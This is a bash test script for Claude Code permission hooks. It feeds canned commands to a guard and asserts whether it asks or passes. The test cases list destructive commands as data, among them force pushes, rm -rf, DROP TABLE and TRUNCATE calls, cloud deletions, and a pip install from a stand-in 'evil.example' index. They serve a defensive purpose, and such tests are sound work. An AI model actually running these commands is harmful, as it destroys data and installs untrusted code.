#!/usr/bin/env bash
# Fixture tests for the hooks in this directory: feed canned hook JSON, assert the decision.
# Run after ANY change to .claude/hooks/ or .claude/settings.json:  .claude/hooks/test-hooks.sh
# Ported from enrichmeai/valuedocs (2026-09-26), whose "ask" cases were each first seen passing
# silently (RED) there; the culvert-specific cases (deploy markers, publishing, scripts/gcp) were
# added here with the port.
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
fail=0; n=0

guard() { # $1 = command, $2 = cwd (optional) -> prints "ask" or "pass"
  local out
  out=$(jq -n --arg c "$1" --arg d "${2:-$PWD}" '{tool_input:{command:$c}, cwd:$d}' | "$here/guard-destructive.sh")
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "ask" ] && echo ask || echo pass
}
expect() { # $1 = expected, $2 = actual, $3 = label
  n=$((n+1)); if [ "$1" != "$2" ]; then echo "FAIL: expected $1, got $2 — $3"; fail=1; fi
}

# A scratch repo on a feature branch, so "push while on main" depends only on the command.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
git -C "$tmp" init -q -b feature 2>/dev/null || { git -C "$tmp" init -q && git -C "$tmp" checkout -q -b feature; }
git -C "$tmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

while IFS='|' read -r want cmd; do
  [ -z "$want" ] || [ "${want:0:1}" = "#" ] && continue
  expect "$want" "$(guard "$cmd" "$tmp")" "$cmd"
done <<'CASES'
# --- git ---
ask|git push --force origin feat
ask|git -C . push -f origin feat
ask|git push origin +feat
ask|git push --force-with-lease=feat:abc origin feat
ask|git push origin main
ask|git push origin HEAD:main
ask|git push origin --delete feat
ask|git push --tags
ask|cd x && git reset --hard origin/main
ask|git clean -fd
ask|git checkout -- .
ask|git tag v0.3.0
ask|git tag -d v0.1.0
ask|git tag -a java-0.3.0 -m x
# --- deploy markers (CLAUDE.md § "Deploy & cost rules" 1) ---
ask|git commit -m "feat: x [deploy]"
ask|git commit -am 'feat: x [publish:deploy]'
ask|git -C . commit -m "chore [deploy]"
# Deliberate: ci/deploy workflows match the marker anywhere in the message, even in prose.
ask|git commit -m "docs: explain the [deploy] marker"
# --- DCO: only a person signs off ---
ask|git commit -s -m "feat: x"
ask|git commit -sm "feat: x"
ask|git -c user.name=Claude commit -qsam "x"
ask|git commit --signoff -m x
ask|git rebase --signoff origin/main
# --- deletes ---
ask|rm -rf build
ask|rm -fr /tmp/x
ask|rm -r /tmp/x
ask|rm -R dir
ask|rm --recursive dir
# --- cloud ---
ask|terraform -chdir=infrastructure/terraform apply
ask|terraform apply -auto-approve
ask|gcloud dataflow flex-template run x
ask|/usr/bin/gcloud projects list
ask|env gcloud config list
ask|bq rm -t ds.t
ask|gsutil rm gs://b/o
ask|kubectl apply -f x.yaml
ask|helm upgrade --install airflow infrastructure/k8s/charts/airflow
ask|scripts/gcp/00_full_reset.sh --force
ask|./scripts/gcp/03_create_infrastructure.sh
ask|bash scripts/gcp/e2e_pipeline_test.sh
ask|cd scripts/gcp && ./06_test_pipeline.sh
ask|bash scripts/check_gcp_services.sh
ask|./scripts/bootstrap_infrastructure.sh my-project
# Conservative, as in valuedocs: the word gcloud as a command argument also asks.
ask|grep -n gcloud scripts/gcp/03_create_infrastructure.sh
# --- publishing and releases ---
ask|mvn -B deploy
ask|cd data-pipeline-libraries-java && mvn -B -P release deploy
ask|mvn -Prelease verify
ask|mvn -P it verify
ask|mvn -B -pl data-pipeline-gcp-gcs-java -P it verify
ask|twine upload dist/*
ask|python -m twine upload dist/*
ask|hatch publish
ask|gh release create v0.3.0
ask|gh pr merge 201 --squash
ask|gh workflow run deploy-generic.yml
ask|gh workflow enable ci.yml
ask|gh api -X DELETE repos/x/y/git/refs/heads/z
ask|gh api repos/x/y/issues --method POST -f t=x
# gh api writes without -X: a field (-f/-F/--field/--raw-field) or --input makes it a POST (#251)
ask|gh api repos/x/y/issues -f title=x
ask|gh api repos/x/y/git/refs --input ref.json
ask|gh api repos/x/y/labels -F name=bug --raw-field color=f00
ask|gh api graphql -f query='mutation { addComment(input:{}) { clientMutationId } }'
# --- databases (#251; ported from enrichmeai.github.io) ---
ask|psql "host=10.0.0.5 dbname=culvert user=culvert" -c "select 1"
ask|pg_restore -d culvert dump.sql
ask|dropdb culvert
ask|liquibase update
ask|psql
ask|cat dump.sql | psql
ask|az
ask|python3 -c "conn.execute('DROP TABLE job_control.stage_claims')"
ask|sqlite3 x.db "delete from t"
ask|python3 -c "c.execute('TRUNCATE TABLE job_control.pipeline_jobs')"
# --- other clouds' CLIs: the AWS and Azure adapters reach real accounts (#251) ---
ask|aws s3 rm s3://b/k
ask|aws dynamodb delete-table --table-name t
ask|/usr/local/bin/aws athena start-query-execution --query-string x
ask|az storage blob delete -c x -n y
ask|pip install -e git+https://example.com/x.git#egg=x
ask|pip install --index-url https://evil.example/simple x
# --- must stay silent ---
pass|git push -u origin claude/culvert-autonomous-workflow-bbswrz
pass|git push
pass|git push origin feature-main-thing
pass|git status
pass|git commit -S -m "gpg-signed, not a DCO sign-off"
pass|git commit -m "docs: the DCO sign-off rule"
pass|git tag
pass|git tag -l
pass|git tag --list 'v*'
pass|git checkout -b feat origin/main
pass|git commit -m "feat: deployment docs for deploy-generic"
pass|mvn -B -q -pl data-pipeline-libraries-java/data-pipeline-core-java -am test-compile
pass|mvn -B -pl data-pipeline-libraries-java/data-pipeline-gcp-gcs-java -am test -Dtest=GcsBlobStoreTest
pass|mvn -f deployments/reference-e2e-gcp/pom.xml test
pass|mvn -Pintegration-docs site
pass|cat scripts/gcp/00_full_reset.sh
pass|rm build/tmp.txt
pass|rm -f build/tmp.txt
pass|terraform plan
pass|helm template x infrastructure/k8s/charts/airflow
pass|gh pr view 12
pass|gh api repos/x/y/pulls
pass|gh api repos/x/y/pulls --jq '.[].number'
pass|gh api graphql -f query='query { viewer { login } }'
pass|gh api repos/o/r/contents | xargs ls -f
pass|gh api -X GET search/issues -f q=repo:x/y
pass|grep -rn "DROP TABLE" deployments
pass|git log --grep "delete from"
pass|grep -rn "aws s3" docs
pass|pip install -e 'data-pipeline-libraries/data-pipeline-core[test]'
pass|python -m pytest data-pipeline-libraries/data-pipeline-core/tests -q
pass|flake8 data-pipeline-libraries
pass|grep -rn "terraform" docs
CASES

# Bare `git push` while the current branch IS main.
git -C "$tmp" checkout -q -b main 2>/dev/null || git -C "$tmp" checkout -q main
expect ask "$(guard 'git push' "$tmp")" 'git push (on main)'
expect ask "$(guard 'git push origin' "$tmp")" 'git push origin (on main)'

# post-edit-check: exit 2 on broken JSON/Python/YAML/pom, 0 on good, 0 for files outside its scope.
# Fixtures live outside the scratch repo, so the Stop-hook cases below see only their own files.
ptmp=$(mktemp -d); trap 'rm -rf "$tmp" "$ptmp"' EXIT
pe() { jq -n --arg f "$1" '{tool_input:{file_path:$f}}' | CLAUDE_PROJECT_DIR="$ptmp" "$here/post-edit-check.sh" >/dev/null 2>&1; echo $?; }
printf '{"a":1}' > "$ptmp/good.json"; printf '{"a":' > "$ptmp/bad.json"
printf 'x = 1\n' > "$ptmp/good.py"; printf 'def f(:\n' > "$ptmp/bad.py"
printf '<project></project>\n' > "$ptmp/pom.xml"; mkdir -p "$ptmp/m"; printf '<project>\n' > "$ptmp/m/pom.xml"
mkdir -p "$ptmp/dir with space"; printf '{"a":' > "$ptmp/dir with space/bad.json"
mkdir -p "$ptmp/chart/templates"; printf '{{ .Values.x }}: [\n' > "$ptmp/chart/templates/x.yaml"
expect 0 "$(pe "$ptmp/good.json")" 'post-edit good.json'
expect 2 "$(pe "$ptmp/bad.json")" 'post-edit bad.json'
expect 0 "$(pe "$ptmp/good.py")" 'post-edit good.py'
expect 2 "$(pe "$ptmp/bad.py")" 'post-edit bad.py'
expect 0 "$(pe "$ptmp/pom.xml")" 'post-edit good pom.xml'
expect 2 "$(pe "$ptmp/m/pom.xml")" 'post-edit bad pom.xml'
expect 0 "$(pe "$ptmp/chart/templates/x.yaml")" 'post-edit helm template is not YAML'
expect 2 "$(pe "$ptmp/dir with space/bad.json")" 'post-edit path with spaces'
printf 'echo hi\n' > "$ptmp/good.sh"; printf 'if then\n' > "$ptmp/bad.sh"
expect 0 "$(pe "$ptmp/good.sh")" 'post-edit good.sh'
expect 2 "$(pe "$ptmp/bad.sh")" 'post-edit bad.sh (bash -n, #251)'
expect 0 "$(pe "$ptmp/missing.json")" 'post-edit deleted file'
expect 0 "$(pe "")" 'post-edit no file_path'
if python3 -c 'import yaml' 2>/dev/null; then
  printf 'a: [\n' > "$ptmp/bad.yml"
  expect 2 "$(pe "$ptmp/bad.yml")" 'post-edit bad.yml'
fi

# stop-fast-gates: no origin/main and nothing to check -> allow the stop silently.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh")); rc=$?
expect "0:" "$rc:$out" 'stop hook with nothing to check'

# stop-fast-gates: a failing fast-pytest package blocks once, then lets the stop through with a warning.
if python3 -m pytest --version >/dev/null 2>&1; then
  mkdir -p "$tmp/.claude/hooks" "$tmp/pkg/tests"
  echo pkg > "$tmp/.claude/hooks/fast-pytest.txt"
  printf 'def test_x():\n    assert 1 == 2\n' > "$tmp/pkg/tests/test_x.py"
  out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
  expect block "$(jq -r '.decision // empty' <<<"$out")" 'stop hook blocks on a failing fast-pytest package'
  out=$(echo '{"stop_hook_active":true}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
  expect "" "$(jq -r '.decision // empty' <<<"$out")" 'stop hook lets the second stop through'
  printf 'def test_x():\n    assert 1 == 1\n' > "$tmp/pkg/tests/test_x.py"
  out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
  expect "" "$out" 'stop hook silent once the package is green'
fi

# stop-fast-gates (#251): a change under .claude/hooks runs the hook tests; failing ones block the stop.
mkdir -p "$tmp/.claude/hooks"
printf '#!/usr/bin/env bash\necho "FAIL: a fixture"; exit 1\n' > "$tmp/.claude/hooks/test-hooks.sh"; chmod +x "$tmp/.claude/hooks/test-hooks.sh"
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect "block|yes" "$(jq -r '[.decision, (.reason | test("test-hooks.sh failed") | if . then "yes" else "no" end)] | join("|")' <<<"$out" 2>/dev/null)" 'stop hook runs the hook tests when .claude/hooks changes'
printf '#!/usr/bin/env bash\nexit 0\n' > "$tmp/.claude/hooks/test-hooks.sh"
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect "" "$out" 'stop hook silent once the hook tests pass'
rm -rf "$tmp/.claude" "$tmp/pkg"

# stop-fast-gates (#251): changed Java with no mvn on PATH is reported as NOT RUN, never passed or skipped.
jtmp=$(mktemp -d); trap 'rm -rf "$tmp" "$ptmp" "$jtmp"' EXIT
git -C "$jtmp" init -q -b feature 2>/dev/null || { git -C "$jtmp" init -q && git -C "$jtmp" checkout -q -b feature; }
git -C "$jtmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
mkdir -p "$jtmp/mod/src"; printf '<project/>\n' > "$jtmp/pom.xml"; printf '<project/>\n' > "$jtmp/mod/pom.xml"
printf 'class A {}\n' > "$jtmp/mod/src/A.java"
nomvn=$(printf '%s' "$PATH" | tr ':' '\n' | while read -r d; do [ -x "$d/mvn" ] || printf '%s:' "$d"; done)
if PATH="$nomvn" command -v git >/dev/null && PATH="$nomvn" command -v jq >/dev/null && ! PATH="$nomvn" command -v mvn >/dev/null; then
  out=$(echo '{"stop_hook_active":false}' | (cd "$jtmp" && PATH="$nomvn" CLAUDE_PROJECT_DIR="$jtmp" "$here/stop-fast-gates.sh"))
  expect "yes" "$(jq -r '.systemMessage // "" | test("did NOT run") | if . then "yes" else "no" end' <<<"$out" 2>/dev/null)" 'stop hook: Java changed, mvn missing -> reported as not run'
else
  echo "SKIPPED: mvn shares a directory with git or jq here, so the no-mvn case cannot be staged"
fi

# read-gate (#251; ported from enrichmeai.github.io PR #52): a whole read of a text file over the limit
# is denied with a pointer to a slice or a search; a slice, a small file, a binary, a missing file and
# a piped cat all pass.
rg() { # $1 = tool, $2 = JSON tool_input -> "deny" or "pass"
  local out
  out=$(jq -n --arg t "$1" --argjson i "$2" --arg d "$tmp" '{tool_name:$t, tool_input:$i, cwd:$d}' \
    | (cd "$tmp" && CLAUDE_READ_GATE_LINES=350 "$here/read-gate.sh" 2>/dev/null))
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "deny" ] && echo deny || echo pass
}
seq 1 400 > "$tmp/big.txt"; seq 1 350 > "$tmp/edge.txt"; seq 1 20 > "$tmp/small.txt"
head -c 20000 /dev/urandom > "$tmp/blob.bin"; mkdir -p "$tmp/d s"; seq 1 400 > "$tmp/d s/big.md"
expect deny "$(rg Read "{\"file_path\":\"$tmp/big.txt\"}")" 'read-gate: whole read of 400 lines'
expect deny "$(rg Read '{"file_path":"big.txt"}')" 'read-gate: relative path, resolved from cwd'
expect deny "$(rg Read "{\"file_path\":\"$tmp/d s/big.md\"}")" 'read-gate: path with a space'
expect pass "$(rg Read "{\"file_path\":\"$tmp/edge.txt\"}")" 'read-gate: exactly the limit'
expect pass "$(rg Read "{\"file_path\":\"$tmp/small.txt\"}")" 'read-gate: small file'
expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"offset\":100,\"limit\":50}")" 'read-gate: a slice'
expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"limit\":200}")" 'read-gate: limit alone'
expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"offset\":300}")" 'read-gate: offset alone'
expect pass "$(rg Read "{\"file_path\":\"$tmp/blob.bin\"}")" 'read-gate: binary file'
expect pass "$(rg Read "{\"file_path\":\"$tmp/missing.txt\"}")" 'read-gate: missing file'
expect deny "$(rg Bash "{\"command\":\"cat $tmp/big.txt\"}")" 'read-gate: cat of a big file'
expect deny "$(rg Bash '{"command":"cat big.txt"}')" 'read-gate: cat, relative path'
expect pass "$(rg Bash "{\"command\":\"cat $tmp/big.txt | grep 7\"}")" 'read-gate: cat piped into a filter'
expect pass "$(rg Bash "{\"command\":\"cat $tmp/big.txt > $tmp/copy.txt\"}")" 'read-gate: cat redirected'
expect pass "$(rg Bash "{\"command\":\"cat $tmp/small.txt\"}")" 'read-gate: cat of a small file'
expect pass "$(rg Bash "{\"command\":\"head -n 50 $tmp/big.txt\"}")" 'read-gate: head is bounded'
expect pass "$(rg Bash "{\"command\":\"sed -n '1,50p' $tmp/big.txt\"}")" 'read-gate: sed slice'
expect pass "$(rg Bash '{"command":"git status"}')" 'read-gate: unrelated command'
expect pass "$(rg Edit "{\"file_path\":\"$tmp/big.txt\"}")" 'read-gate: another tool is not its business'
# the payload's cwd decides a relative path, not the directory the hook runs in
out=$(jq -n --arg d "$tmp" '{tool_name:"Read", tool_input:{file_path:"big.txt"}, cwd:$d}' | (cd / && "$here/read-gate.sh" 2>/dev/null))
expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: relative path from the payload cwd'
# the whole deny object, in the form the hooks docs specify (exit 0, hookSpecificOutput)
out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | "$here/read-gate.sh" 2>/dev/null); rc=$?
expect "0|PreToolUse|deny|yes" "$rc|$(jq -r '[.hookSpecificOutput.hookEventName, .hookSpecificOutput.permissionDecision, (.hookSpecificOutput.permissionDecisionReason | test("400 lines.*offset and limit.*grep -n") | if . then "yes" else "no" end)] | join("|")' <<<"$out" 2>/dev/null)" 'read-gate: exit 0 with the deny object and a reason naming a slice and grep -n'
expect deny "$(rg Bash "$(jq -n --arg c "cat -n \"$tmp/d s/big.md\"" '{command:$c}')")" 'read-gate: cat -n of a quoted path'
expect deny "$(rg Bash "{\"command\":\"cat -- $tmp/big.txt\"}")" 'read-gate: cat -- file'
printf '%s' "$(seq 1 351)" > "$tmp/nonl.txt"
expect deny "$(rg Read "{\"file_path\":\"$tmp/nonl.txt\"}")" 'read-gate: 351 lines, no final newline'
out=$(jq -n --arg f "$tmp/small.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_READ_GATE_LINES=10 "$here/read-gate.sh" 2>/dev/null)
expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: CLAUDE_READ_GATE_LINES moves the limit'
out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_READ_GATE_LINES=lots "$here/read-gate.sh" 2>&1)
expect "deny" "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: a non-numeric CLAUDE_READ_GATE_LINES falls back to 350, with no shell error'
expect "0:" "$(printf 'not json' | "$here/read-gate.sh" >/dev/null 2>&1; echo "$?:")" 'read-gate: garbage input passes silently'
out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_SKIP_READ_GATE=1 "$here/read-gate.sh" 2>/dev/null)
expect "" "$out" 'read-gate: CLAUDE_SKIP_READ_GATE=1 turns it off'
rm -rf "$tmp/big.txt" "$tmp/edge.txt" "$tmp/small.txt" "$tmp/blob.bin" "$tmp/d s" "$tmp/nonl.txt" "$tmp/copy.txt"

echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
exit $fail
